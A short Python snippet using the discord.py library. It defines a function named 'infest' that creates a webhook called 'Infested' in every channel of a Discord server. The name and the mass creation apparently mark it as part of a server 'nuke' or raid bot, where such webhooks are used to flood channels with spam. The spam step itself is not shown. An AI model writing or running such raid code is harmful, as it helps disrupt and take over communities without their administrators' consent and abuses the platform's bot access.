import discord
from discord.ext import commands
async def infest(channel):
    guild = channel.guild
    for channel in guild.channels:
        print(f"Created webhook in: '{channel}'")
        await channel.create_webhook(name="Infested")